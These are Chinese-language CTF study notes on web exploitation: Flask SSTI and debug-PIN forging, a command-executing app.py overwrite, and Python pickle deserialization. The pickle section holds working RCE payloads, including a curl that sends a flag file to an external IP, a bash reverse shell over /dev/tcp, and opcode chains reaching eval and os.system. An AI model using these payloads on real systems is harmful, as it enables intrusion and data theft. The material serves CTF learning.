# Web CTF Notes — Flask、Python、Pickle、FastAPI 与 XPath

> 来源：source/本科web笔记.md
> 内容按原笔记保留，仅添加本分组标题。

## 十二、Flask 题目

## 🍶 十二、Flask 题目

> [!summary] 速览
> - 漏洞函数：`render_template_string` → SSTI；`__import__('os').popen('cat /f*').read()`
> - Flask debug PIN 计算要素：username、modname、appname、moddir、uuidnode（MAC）、machine-id + boot_id + cgroup
> - 拿 MAC：`local_file:///sys/class/net/eth0/address`；`/proc/self/cmdline`、`/proc/self/cgroup` 判断是否容器
> - 例题 flask disk：debug 模式下覆盖 `app.py`，改完立即重载 → 直接 RCE

漏洞函数

render_template_string(index)--sstl注入

__import__('os').popen('cat /f*').read()

local_file:///sys/class/net/eth0/address

### Flask 的 ping 值计算

1.username 启动flask的用户名 (/etc/passwd 读取）

2.modname 默认值flask.app

3.appname 默认flask

4.moddir 可通过报错信息得到 flask库下app.py的绝对路径 /etc/pass

5.uuidnode 读取/sys/class/net/eth0/address MAC地址十六进制转化为十进制 根据网卡名称自行更改

6.machine-id（更正）/proc/sys/kernel/random/boot_id

/proc/self/cgroup  看是不是docker

/proc/sys/kernel/rand]

/etc/machine-id+/proc/self/cgroup合起来才是后半段

/proc/sys/kernel/random/boot_id+/proc/self/cgroup

 `/proc/self/cmdlind`

```python
#02:42:ac:02:45:95
import random
 
random.seed(0x0242ac024595)
print (str(random.random()*233))
 
#231.281943387   #secret_key
 
 
 
#python main.py decode -s 231.28194338656192 -c "eyJwYXNzcG9ydCI6IllhbWlZYW1pIn0.ZETklg.pEPhZ5o8PxJOT7pLSFqlhNV28EQ"   #解密
#python main.py encode -s 231.28194338656192 -t "{'passport': 'Welcome To HDCTF2023'}"    #加密
#eyJwYXNzcG9ydCI6IldlbGNvbWUgVG8gSERDVEYyMDIzIn0.ZETyAw.dHJKdmKcdjzcIOEL-bbhrFuedE4     #加密结果

```

读取文件用python2

 import random

 random.seed(0x0242ae0295f6)

 print(str(random.random()*233))

local_file:///

### Flask 例题

flask disk

· **考点**：Phar反序列化、gzip压缩、无回显RCE

· **FLAG**：动态FLAG

· **解题步骤**

访问admin manage发现要输入pin码，说明flask开启了debug模式。

flask开启了debug模式下，app.py源文件被修改后会立刻加载。

所以只需要上传一个能rce的app.py文件把原来的覆盖，就可以了。注意语法不能出错，否则会崩溃。

from flask import Flask,request

import os

app = Flask(__name__)

@app.route('/')

def index():

try:

cmd = request.args.get('cmd')

data = os.popen(cmd).read()

return data

except:

pass

return "1"

if __name__=='__main__':

app.run(host='0.0.0.0',port=5000,debug=True)

> [!missing] 图片缺失：原文件为 WPS 临时图片 `wps6.jpg`

---


## 二十二、Python 用法

## 🐍 二十二、Python 用法

> [!summary] 速览
> - 脚本模板：正则从页面提取计算式 → 计算 → 回填答案（配合 `requests` / `re` / `math`）

1.正则提取计算

```python
import math

import requests
import re
url = 'http://82.157.146.43:14709/'
payload = {
    "input": "123",
    "ans": "12"
}
math=''
res = requests.post(url, payload)
num_pattern = re.compile(r'<div style="display:inline;">(.*?)</div>')
num = num_pattern.findall(res.text)  # 正则提取公式
payload="9223372036854775807"+'+'+math.join(num)[0:-1]
print(payload)

```

---


## 二十三、Pickle 反序列化

## 🥒 二十三、Pickle 反序列化

> [!summary] 速览
> - 常规：`__reduce__` 返回 `(commands.getoutput, ('ls /',))` 或 `subprocess.call`，再 `pickle.dumps` + `urllib.quote`
> - 手写 opcode：`c` 引入模块、`S` 压字符串、`t/R` 组元组并调用、`g` / `p` 用 memo、`o` / `b` 走 `__setstate__`
> - builtins 链：`getattr(dict,'get')` → `globals()` → 取 `__builtins__` → `eval` 执行任意代码
> - 敏感字符 bypass：`R` 指令绕过、`map/filter`、`bytes/tuple`、`__setstate__` + `os.system`

https://xz.aliyun.com/t/11807?time__1311=mqmx0DBD90qWqGNqeeqBImcr%3Dt0QDnBgoD&alichlgref=https%3A%2F%2Fwww.bing.com%2F

常用payload

 return (commands.getoutput,('ls /',))

常规

```python
import pickle
import urllib
import commands

class payload(object):
    def __reduce__(self):
        return (commands.getoutput,('ls /',))

a = payload()
print urllib.quote(pickle.dumps(a))

```

```python
import pickle
import base64

class GetShellWithPython(object):
    def __reduce__(self):
        import subprocess
        return (subprocess.call,
                (['python',
                  '-c',
                  'import os;'
                  'os.system("curl http://49.232.224.59:3389?a=`cat /flag`");'],))

pickleData = pickle.dumps(GetShellWithPython())
pickle.loads(pickleData)
print(base64.b64encode(pickleData))

```

 pickle的构造大致分成两种：

1.自己手写

```text
cos
system #引入 os 模块的 system 方法，这里实际上是一步将函数添加到 stack 的操作
(S'ls /' # 把当前 stack 存到 metastack，清空 stack，再将 'ls' 压入 stack
tR. # t 也就是将 stack 中的值弹出并转为 tuple，把 metastack 还原到 stack，再将 tuple 压入 stack
    # R 的内容就成为了 system(*('ls /',)) ，然后 . 代表结束，返回当前栈顶元素
<=> __import__('os').system(*('ls /',))

```

实现成功

![img](https://img-blog.csdnimg.cn/direct/0175b32afe18438eadeec1f8a397fc83.png)

2.利用 pickle 的 `__reduce__` 可以直接用它的操作模式实现我们上面手搓的 `__import__('os').system(*('ls',))` 的构造。（ 缺点：只能执行单一的函数，很难构造复杂的操作 ）

成功

![](image-20240224152444594%201.png)

现在ctf的比赛都在变难，所以最基本的pick序列化可能不怎么够用了，所以大多要第一种需要绕过默写特定指令

只能用内置builtins

```python
opcode=b'''cbuiltins
getattr
p0                    #取到 getattr
(cbuiltins
dict
S'get'
tRp1
cbuiltins
globals
)Rp2                  # getattr(dict, 'get')
00g1
(g2
S'__builtins__'       # get(__import__('builtins').globals(), '__builtins__')
tRp3
0g0
(g3
S'eval'
tR(S'__import__("os").system("calc")'    # 取到 eval 然后实现 RCE
tR.
'''

```

```python
opcode = b'''cbuiltins
getattr         # 使用c，获取 getattr 这个可执行对象
(cbuiltins
dict
S'get'
tR(cbuiltins
globals
(tRS'builtins'
tRp1            # 用dict.get来从globals的结果中拿到上下文里的builtins对象，并将这个对象放置在memo[1]
cbuiltins
getattr
(g1
S'eval'         # 利用得到的 builtins 对象调用 getattr('builtins', 'eval')
tR(S'__import__("os").system("calc")' 写入 eval 的参数
tR.
'''

```

R指令绕过

```python
import pickle

class Person:
    def __init__(self,age):
        self.age=age

opcode=b'''(c__main__
Person
I18
o}(S"__setstate__"
cos
system
ubS"calc"
b.'''

p=pickle.loads(opcode)

```

python内置函数 可绕i，b，R，o

```python
import pickle
opcode=b'''c__builtin__
map //filter
p0
0(S'whoami'
tp1
0(cos
system
g1
tp2
0g0
g2
\x81p3
0c__builtin__
bytes //tuple
p4
(g3
t\x81.'''

pickle.loads(opcode)

```

过滤R_reduce

```python
import base64
a='''V__setstate__
(S"bash -c 'bash -i >& /dev/tcp/47.99.125.16/3389 0>&1'"
ios
system
.'''
print(base64.b64encode(a.encode()))

```

### 敏感字符 bypass

#### S 操作码

`S` 操作码本身是 String ，是支持十六进制的识别的

```text
S'flag' => S'\x66\x6c\x61\x67'

```

```text
S'flag' => V'\u0066\u006C\u0061\u0067'

```

```text
不用单引号-0(V\u0077\u0068\u006f\u0061\u006d\u0069

```

用原本函数

```python
b'''(cconfig
backdoor
(S'__import__("os").popen("cat /flag.txt").read()'
lo.'''

/**
* 复制并使用代码请注明引用出处哦~
* Lazzaro @ https://lazzzaro.github.io
*/

```

![](image-20240224154151333%201.png)

---


## 二十八、FastAPI

## ⚡ 二十八、FastAPI

> [!summary] 速览
> - 自带交互式文档 `/docs`；有 POST 传参页面，参数 `q` 传入计算式得到结果

发现其自带交互式[API](https://so.csdn.net/so/search?q=API&spm=1001.2101.3001.7020)文档，访问/docs页，有采用POST方式传参的/cccalccc页，参数q传入计算式得到结果。

---


## 二十九、XPath 注入

## 🧭 二十九、XPath 注入

> [!summary] 速览
> - **待补充**：本章目前为空，只有标题占位

---

